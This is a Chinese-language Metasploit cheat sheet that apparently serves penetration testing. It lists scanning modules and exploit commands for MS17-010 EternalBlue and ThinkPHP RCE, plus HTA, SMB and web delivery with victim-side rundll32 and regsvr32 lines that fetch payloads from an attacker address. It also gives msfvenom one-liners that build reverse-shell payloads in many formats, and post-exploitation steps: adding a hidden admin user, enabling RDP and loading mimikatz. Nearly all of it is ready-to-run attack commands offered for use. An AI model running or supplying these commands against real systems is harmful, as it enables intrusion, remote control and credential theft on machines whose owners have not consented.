#### 辅助模块(auxiliary)

***

##### 0x01 主机发现

搜索：`search aux /scanner/discovery`

使用：`auxiliary/scanner/discovery/arp_sweep`

```sh
use auxiliary/scanner/discovery/arp_sweep
set rhosts 192.168.64.0/24
run
```

##### 0x02 服务扫描

搜索：`search _version`

`search scanner/telnet`

`search scanner/ssh`

`search scanner/oracle`

`search scanner/smb`

```sh
use auxiliary/scanner/smb/smb_version
set rhost 192.168.64.136
set threads 10
run
```

`search scanner/mssql`

`search scanner/ftp`

`search scanner/snmp`

`search scanner/smtp`

##### 0x03 登陆探测

搜索：`search _login`

##### 0x03 端口扫描

搜索：`search scanner/portscan`

```sh
use auxiliary/scanner/portscan/syn
set rhosts 192.168.64.136
set threads 20
run
```

<br/>

#### 漏洞利用模块(exploits)

***

##### 0x01 windows漏洞利用模块(ms17-010)

搜索：`search ms17-010`

利用：

```sh
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 192.168.64.136
check   // 检测漏洞是否存在
run //执行攻击上线
```

##### 0x02 Linux - Thinkphp-RCE

```sh
use exploit/unix/webapp/thinkphp_rce
set rhosts 192.168.64.129
set rport 9000
set srvport 38080
set lhost 192.168.1.129  // 攻击机出网地址
set lport 4566 // 监听端口
set ReverseListenerBindAddress 192.168.1.129 //要在本地系统上绑定到的特定IP地址
run
```

##### 0x03 HTA Web Server

通过windows自带的hta执行工具建立连接

```sh
use exploit/windows/misc/hta_server
set payload windows/x64/meterpreter/reverse_tcp
set srvhost 192.168.1.129
set target 1
run -j
```

##### 0x04 SMB Delivery

通过smb服务暴露payload

```sh
use exploit/windows/smb/smb_delivery
set payload windows/x64/meterpreter/reverse_tcp
set srvhost 192.168.1.129
set lport 5577
exploit -j

# 被控端执行
rundll32.exe \\192.168.1.129\mBqd\test.dll,0
```

##### 0x05 Web Delivery

通过web服务器执行远程payload

```sh
use exploit/multi/script/web_delivery
set srvhost 192.168.1.129
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.1.129
set lport 7789
set target 3
exploit -j

# 被控端执行
regsvr32 /s /n /u /i:http://192.168.1.129:8080/T8f1PwYf7Ao3.sct scrobj.dll
```

<br/>

#### 攻击载荷(payloads)

***

##### 0x00 监听器

```sh
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.40.132
set lport 5445
run -j
```

<br/>

##### 0x01 分阶段反向tcp连接

```sh
# windows/x64/meterpreter/reverse_tcp
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.40.132 lport=5445 -f exe o m1.exe

```

<br/>

##### 0x02 web类型payload

```sh
# php
msfvenom-p php/meterpreter/reverse_tcp LHOST=192.168.2.2 LPORT=4444 -f raw > shell.php
```

```sh
# asp
msfvenom -a x64 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.2.2 LPORT=4444 -f aspx -o shell.aspx
```

```sh
# jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.2.2 LPORT=4444 -f raw > shell.jsp
```

```sh
# war
msfvenom-p java/jsp_shell_reverse_tcp LHOST=192.168.2.2 LPORT=4444 -f war > shell.war
```

<br/>

##### 0x03 原生未加密处理的payload

```sh
msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.40.132 lport=5555 -f raw -o shell.php
```

<br/>

##### 0x04 脚本payload

```sh
# python
msfvenom-p python/meterpreter/reverse_tcp LHOST=192.168.2.2 LPORT=4444 -f raw > shell.py
```

```sh
# powershell
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=192.168.2.2 LPORT=4444 -f psh > s hell.ps1
```

```sh
# bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.2.2 LPORT=4444 -f raw > shell.sh
```

```sh
# perl
msfvenom-p cmd/unix/reverse_perl LHOST=192.168.2.2 LPORT=4444 -f raw > shell.pl
```

<br/>

<br/>

#### 后渗透模块(post)

***

##### 0x01 打开微软远程桌面

```sh
# post/windows/manage/enable_rdp
# 在meterpreter回话中运行
run post/windows/manage/enable_rdp

#可以利用该命令，在目标机器上添加用户 
run getgui –u admin –p admin 
net localgroup administrators admin /add

#远程连接桌面 
rdesktop –u username –p password ip
```

##### 0x01 删除指定win账号

```sh
#删除指定账号 
run post/windows/manage/delete_user USERNAME=admin
```

##### 0x02 猕猴桃

```sh
# load mimikatz
load kiwi
```

##### 0x03 检测是否虚拟机

```sh
run checkvm
```

##### 0x04 获取软件安装信息

```sh
run post/windows/gather/enum_applications
```

<br/>

#### 编码器模块(encoders)

***

<br/>

#### 躲避模块(evasion)

***

<br/>

#### 空指令模块(nops)

***
